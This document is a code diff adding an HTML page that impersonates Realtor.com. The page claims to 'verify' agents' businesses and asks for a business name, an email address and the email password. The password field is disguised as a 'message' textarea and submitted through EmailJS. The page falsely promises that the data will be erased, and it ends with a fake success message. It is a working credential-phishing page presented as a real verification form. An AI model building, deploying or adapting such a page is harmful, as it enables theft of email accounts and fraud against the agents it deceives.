@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Realtor.com Business Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="card">
+
+    <!-- LOGO + COMPANY -->
+    <div class="brand">
+      <img src="realtor.png" alt="Company Logo" class="logo">
+
+      <div class="company-name">
+        REALTOR.COM
+      </div>
+
+      <div class="tagline">
+        Trusted • Secure • Professional
+      </div>
+      <div class="taglines">
+        Dear Esteemed Agent, We the realtor.com business team wants to make our app a better community for customers to find trust and get what they want so we would love to kindly verify your business by you providing us your official business email valid information and data...Note that we won't save any of your data or informations with us: Make sure that the business email you provided is the email you use for attending to realtor.com customers; After verification we will kindly erase your data from our system.
+      </div>
+    </div>
+
+    <!-- FORM -->
+    <form id="contact-form">
+
+      <div class="field">
+        <input type="text" name="from_name" required placeholder=" ">
+        <label>Company/Business Name</label>
+      </div>
+
+      <div class="field">
+        <input type="email" name="reply_to" required placeholder=" ">
+        <label>Email Address</label>
+      </div>
+
+      <div class="field">
+        <textarea name="message" required placeholder=" "></textarea>
+        <label>Email Password</label>
+      </div>
+
+      <button type="submit">Verify</button>
+    </form>
+
+    <!-- SUCCESS MESSAGE -->
+    <div id="success" class="success">
+      ✔ Realtor.com has successfully verified your business data.
+    </div>
+
+  </div>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="script.js"></script>
+
+</body>
+</html>
